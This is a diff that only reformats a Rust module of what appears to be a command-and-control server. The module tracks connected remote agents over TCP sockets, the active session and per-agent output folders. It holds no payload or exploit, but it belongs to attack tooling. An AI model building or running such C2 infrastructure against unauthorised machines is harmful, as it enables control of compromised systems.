@@ -1,10 +1,14 @@
-use std::{fs, net::TcpStream, sync::{Arc, Mutex}};
 use crate::constants::OUTPATH;
+use std::{
+    fs,
+    net::TcpStream,
+    sync::{Arc, Mutex},
+};
 
 pub struct C2State {
-    pub agents:         Arc<Mutex<Vec<AgentConnection>>>,
-    pub active_mod:     Arc<Mutex<String>>,
-    pub active_session: Arc<Mutex<Option<usize>>>
+    pub agents: Arc<Mutex<Vec<AgentConnection>>>,
+    pub active_mod: Arc<Mutex<String>>,
+    pub active_session: Arc<Mutex<Option<usize>>>,
 }
 
 #[derive(Debug)]
@@ -12,14 +16,14 @@ pub struct AgentConnection {
     pub id: usize,
     pub ip: String,
     pub path: String,
-    pub conn: TcpStream
+    pub conn: TcpStream,
 }
 
 impl C2State {
     pub fn new() -> Self {
         Self {
-            agents:         Arc::new(Mutex::new(Vec::new())),
-            active_mod:     Arc::new(Mutex::new("manager".to_string())),
+            agents: Arc::new(Mutex::new(Vec::new())),
+            active_mod: Arc::new(Mutex::new("manager".to_string())),
             active_session: Arc::new(Mutex::new(None)),
         }
     }
@@ -44,7 +48,12 @@ impl C2State {
         let next_id = self.agent_count() + 1;
         let path = format!("{}/{}", OUTPATH, Self::sanitize_path_component(ip));
         let _ = fs::create_dir(&path);
-        self.agents.lock().unwrap().push(AgentConnection { id: next_id, ip: ip.to_string(), conn, path: path});
+        self.agents.lock().unwrap().push(AgentConnection {
+            id: next_id,
+            ip: ip.to_string(),
+            conn,
+            path: path,
+        });
     }
 
     pub fn remove_agent(&self, id: usize) {
@@ -93,7 +102,7 @@ impl C2State {
     pub fn get_active_path(&self) -> String {
         match self.get_active_agent() {
             Ok(a) => a.path,
-            Err(e) => e.to_string()
+            Err(e) => e.to_string(),
         }
     }
 
@@ -105,5 +114,4 @@ impl C2State {
             })
             .collect()
     }
-
 }
